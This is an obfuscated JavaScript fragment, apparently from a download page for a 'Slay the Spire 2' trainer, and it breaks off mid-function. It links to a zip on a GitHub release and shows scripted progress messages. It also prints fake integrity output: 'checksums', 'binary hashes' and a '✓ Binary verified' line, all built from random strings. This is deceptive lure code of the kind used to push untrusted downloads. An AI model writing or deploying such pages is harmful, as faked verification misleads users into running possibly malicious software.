...
// === ССЫЛКА НА ТРЕЙНЕР ===
const TRAINER_URL = "https://github.com/Qalso520/Slay-The-Spire-2-menu/releases/download/1.0/SlayTheSpire2_Trainer.zip";
const DOWNLOAD_FILENAME = "SlayTheSpire2_Trainer.zip";
...
function _0xe3f4() {
  const _0xf4a5 = [
    'Loading STS2 memory offsets...',
    'Applying infinite HP patch...',
    'Hooking damage multipliers...',
    'Unlocking shop items...',
    'Initializing reward system...',
    'Setting up trainer interface...',
    'STS2 trainer ready'
  ];
  const _0xa5b6 = [
    `generating checksum: ${_0xf2a3()}${_0xf2a3()}`,
    `binary hash: ${_0xf2a3(32)}${_0xf2a3(32)}`,
    `✓ Binary verified - hash ${_0xf2a3()}${_0xf2a3()}`
  ];
...
function _0xc9d0a() {
  ...
  setTimeout(() => {
    _0xb4c5('preparing', 'Compiling STS2 trainer modules...');
  }, 800);
  setTimeout(() => {
    _0xb4c5('preparing', 'Linking game memory...');
  }, 1500);
  setTimeout(() => {
